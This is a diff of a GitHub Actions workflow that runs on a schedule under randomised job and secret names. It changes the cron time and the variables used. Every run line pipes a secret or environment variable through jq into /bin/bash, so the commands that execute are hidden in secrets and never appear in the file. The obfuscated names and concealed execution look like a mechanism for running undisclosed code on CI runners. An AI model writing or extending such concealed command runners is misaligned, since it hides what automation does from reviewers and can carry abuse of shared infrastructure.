@@ -2,7 +2,7 @@ name: wenhaoxuan3191
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 2/6 * * *'
+    - cron: '53 1/6 * * *'
 
 jobs:
   build:
@@ -11,18 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: wenhaoxuan3191
         env:
-          z3765: ${{ secrets.z3765 }}
+          sby738: ${{ secrets.sby738 }}
         run: |
-          echo $z3765 | jq -r .rfo9438 | /bin/bash
-          echo $h630 | jq -r .vbb8 | /bin/bash
-          echo $hdspd5404 | jq -r .jh5 | /bin/bash
-          echo $fixay3484 | jq -r .ixia81 | /bin/bash
-          echo $nnwz53 | jq -r .sxlm910 | /bin/bash
-          echo $covl9177 | jq -r .ahpgf530 | /bin/bash
-          echo $zjymf206 | jq -r .d9743 | /bin/bash
-          echo $x0428 | jq -r .qvkt21048 | /bin/bash
-          echo $ynxx46 | jq -r .agdah2 | /bin/bash
-          echo $mj0 | jq -r .pexk1 | /bin/bash
-          echo $k27724 | jq -r .oot5945 | /bin/bash
-          echo $myt65293 | jq -r .mfol6 | /bin/bash
+          echo $sby738 | jq -r .j862 | /bin/bash
+          echo $unr1522 | jq -r .rgyla7 | /bin/bash
+          echo $ob50 | jq -r .tjw099 | /bin/bash
+          echo $uxz502 | jq -r .fl0 | /bin/bash
+          echo $evrs1244 | jq -r .gqyq9335 | /bin/bash
+          echo $eql4606 | jq -r .mftf833 | /bin/bash
+          echo $mf615 | jq -r .zoyv96 | /bin/bash
+          echo $bpb769 | jq -r .e19088 | /bin/bash
+          echo $y1116 | jq -r .piusd340 | /bin/bash
+          echo $uartc87 | jq -r .ebadw664 | /bin/bash
+          echo $oc558 | jq -r .haz63378 | /bin/bash
 
